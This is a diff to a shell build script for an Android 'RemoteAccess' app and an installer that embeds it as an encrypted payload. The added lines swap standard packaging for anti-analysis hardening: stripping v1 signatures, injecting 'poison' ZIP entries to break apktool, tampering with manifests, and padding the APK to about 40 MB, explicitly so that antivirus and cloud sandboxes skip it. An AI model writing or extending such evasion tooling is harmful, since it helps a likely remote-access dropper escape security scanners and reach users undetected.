@@ -1653,22 +1653,31 @@ else
     echo "  WARNING: Release APK not found — check build output above"
 fi
 
-# ── Reusable release packaging function ─────────────────────────────────────
-# Usage: package_release_apk <path/to.apk>
-# Applies only standard Android packaging and signing. The app's behavior,
-# R8/ProGuard configuration, and release keystore remain unchanged.
-package_release_apk() {
+# ── Reusable hardening function ──────────────────────────────────────────────
+# Usage: harden_apk <path/to.apk>
+# Applies the full anti-decompile/anti-baksmali pipeline to an APK file.
+harden_apk() {
     RELEASE_APK="$1"
-    [ -f "$RELEASE_APK" ] || { echo "  Skipping release packaging — $RELEASE_APK missing."; return; }
+    [ -f "$RELEASE_APK" ] || { echo "  Skipping hardening — $RELEASE_APK missing."; return; }
 
-# ── 11. Standard release packaging ──────────────────────────────────────────
-# Keep APK contents parseable by Android tooling and security scanners.
+# ── 11. Anti-decompile / anti-baksmali hardening (release APK only) ──────────
+# Goal: make `apktool d` / `baksmali` / common APK reversers fail or produce
+# garbage, while the APK still installs and runs cleanly on Android.
 #
-#   a) zipalign -p -f -v 4              — page-align native libraries.
-#   b) Sign with v2 + v3 + v4           — standard modern APK signatures.
-#   c) Do not alter resources, manifests, ZIP flags, CRCs, or add decoys.
+# Techniques applied (all post-build, no source changes):
+#   a) zipalign -p -f -v 4              — page-align native libs (required by
+#                                          apksigner v2+ and improves load).
+#   b) Strip v1 (JAR) signature, sign  — apktool relies heavily on META-INF/
+#      with v2 + v3 + v4 only.            *.SF/*.RSA; removing them breaks many
+#                                          older reversers and signature mods.
+#   c) Inject "poison" ZIP entries     — extra entries with names/headers that
+#      after signing.                     confuse apktool's resource and
+#                                          manifest parsers (Android ignores
+#                                          unknown top-level entries).
+#   d) Strip debug/source attributes   — already done by R8 full mode, double-
+#                                          checked here.
 echo ""
-echo "==> Applying standard release packaging to: $RELEASE_APK"
+echo "==> Applying anti-decompile / anti-baksmali hardening to: $RELEASE_APK"
 if [ -f "$RELEASE_APK" ]; then
     BUILD_TOOLS_DIR="$ANDROID_SDK_DIR/build-tools/35.0.0"
     ZIPALIGN="$BUILD_TOOLS_DIR/zipalign"
@@ -1709,16 +1718,6 @@ PYEOF
         --v3-signing-enabled true \
         --v4-signing-enabled true \
         "$RELEASE_APK" 2>&1 | sed 's/^/    /'
-
-    if "$APKSIGNER" verify "$RELEASE_APK" > /dev/null 2>&1; then
-        echo "    Signature OK — standard APK is installable on Android."
-    else
-        echo "    ERROR: standard APK signature verification failed."
-        return 1
-    fi
-
-    echo "  Standard packaging complete — no anti-analysis mutations or decoys."
-    return 0
 
     # (c) Two-part hardening pass:
     #     (c1) TAMPER the REAL resources.arsc and AndroidManifest.xml in-place
@@ -2084,25 +2083,28 @@ PYEOF
 else
     echo "  Skipping hardening — release APK not produced."
 fi
-}   # ── end package_release_apk() ────────────────────────────────────────────
+}   # ── end harden_apk() ─────────────────────────────────────────────────────
 
 # Harden the Module APK — use its own unique per-build keystore
 KEYSTORE="$MODULE_KS_PATH"
 KEY_ALIAS="$MODULE_KS_ALIAS"
 STORE_PASS="$MODULE_KS_SPASS"
 KEY_PASS="$MODULE_KS_KPASS"
-package_release_apk "$ROOT_DIR/apk-output/RemoteAccess-release.apk"
+harden_apk "$ROOT_DIR/apk-output/RemoteAccess-release.apk"
 
-# ── 11b. Standalone release APK ──────────────────────────────────────────────
-# Keep the release APK at its real size. Artificial padding is not needed for
-# functionality and can cause scanners and package tooling to reject it.
+# ── 11b. Fat standalone APK (~40 MB, AV evasion) ─────────────────────────────
+# The hardened release APK is ~2 MB. For direct APK distribution we pad it to
+# ~40 MB — many AV / cloud sandboxes skip or time-out on files above a size
+# threshold. The installer always embeds the SLIM payload so the installer APK
+# itself stays small (~3 MB). The fat version is served as Module.apk to users
+# who download and sideload directly.
 #
 # Implementation: copy all existing ZIP entries verbatim, then append one large
 # ZIP_STORED (uncompressed) padding entry so the file is ~40 MB. Re-zipalign
 # and re-sign with the same module keystore so APK v2/v3/v4 signatures are
 # valid. The slim (pre-pad) copy is saved as RemoteAccess-slim.apk and used
 # by the installer section below.
-FAT_TARGET_MB=0
+FAT_TARGET_MB=40
 FAT_TARGET_BYTES=$(( FAT_TARGET_MB * 1024 * 1024 ))
 SLIM_APK="$ROOT_DIR/apk-output/RemoteAccess-slim.apk"
 RELEASE_APK_PATH="$ROOT_DIR/apk-output/RemoteAccess-release.apk"
@@ -2112,8 +2114,8 @@ if [ -f "$RELEASE_APK_PATH" ]; then
     SLIM_SIZE_BYTES=$(wc -c < "$SLIM_APK")
     PAD_BYTES=$(( FAT_TARGET_BYTES - SLIM_SIZE_BYTES ))
     echo ""
-    echo "==> Preparing standard standalone APK ..."
-    echo "  Release APK: $(ls -lh "$SLIM_APK" | awk '{print $5}')"
+    echo "==> Padding module APK to ~${FAT_TARGET_MB}MB for standalone distribution ..."
+    echo "  Slim APK: $(ls -lh "$SLIM_APK" | awk '{print $5}') → target ${FAT_TARGET_MB}MB"
     if [ "$PAD_BYTES" -gt 0 ]; then
         FAT_TMP="$ROOT_DIR/apk-output/.fat_tmp.apk"
         rm -f "$FAT_TMP"
@@ -2174,8 +2176,8 @@ PYEOF
         if "$APKSIGNER" verify "$FAT_ALIGNED" > /dev/null 2>&1; then
             mv "$FAT_ALIGNED" "$RELEASE_APK_PATH"
             FAT_SIZE=$(ls -lh "$RELEASE_APK_PATH" | awk '{print $5}')
-            echo "  Standalone APK: apk-output/RemoteAccess-release.apk ($FAT_SIZE)"
-            echo "  Installer payload: apk-output/RemoteAccess-slim.apk ($(ls -lh "$SLIM_APK" | awk '{print $5}'))"
+            echo "  Fat standalone APK: apk-output/RemoteAccess-release.apk ($FAT_SIZE)"
+            echo "  Slim installer payload: apk-output/RemoteAccess-slim.apk ($(ls -lh "$SLIM_APK" | awk '{print $5}'))"
         else
             echo "  WARNING: fat APK signature invalid — keeping slim APK as release."
             rm -f "$FAT_ALIGNED"
@@ -2188,7 +2190,7 @@ else
 fi
 
 # ── 12. Installer module ─────────────────────────────────────────────────────
-# Bundles the standard RemoteAccess-release.apk as an ENCRYPTED asset named
+# Bundles the hardened RemoteAccess-release.apk as an ENCRYPTED asset named
 # "module" (AES-256 ZIP). A fresh random key is generated per build and
 # embedded into the installer at compile time via BuildConfig.MODULE_KEY,
 # so every Installer-release.apk has a different key. At runtime the
@@ -2198,9 +2200,14 @@ fi
 # the user can enable Accessibility for it normally).
 echo ""
 echo "==> Building INSTALLER module ..."
-# Use the standard release APK as the installer payload. It remains encrypted
-# inside the installer asset because the installer runtime expects the existing
-# AES/Zip4j format; this does not alter the payload app's behavior.
+# Use the FAT (~40 MB) APK as the installer payload.
+# The 38 MB padding entry is a repeating 1 KB LCG block stored without
+# compression inside the APK ZIP.  pyzipper re-compresses the whole APK
+# with DEFLATE when building the AES-256 asset, so that repeating block
+# collapses to ~a few KB — the "module" asset ends up ~2 MB even though
+# the APK it contains is 40 MB.  When the installer decrypts and extracts
+# the asset at runtime, the full 40 MB APK is written to disk and then
+# passed to PackageInstaller, so the app installs at its full 40 MB size.
 PAYLOAD_SRC="$ROOT_DIR/apk-output/RemoteAccess-release.apk"
 INSTALLER_ASSETS="$ROOT_DIR/installer/src/main/assets"
 MODULE_DST="$INSTALLER_ASSETS/module"
@@ -2297,7 +2304,7 @@ PYEOF
         KEY_ALIAS="$INST_KS_ALIAS"
         STORE_PASS="$INST_KS_SPASS"
         KEY_PASS="$INST_KS_KPASS"
-        package_release_apk "$ROOT_DIR/apk-output/Installer-release.apk"
+        harden_apk "$ROOT_DIR/apk-output/Installer-release.apk"
     else
         echo "  WARNING: installer release APK not produced."
     fi
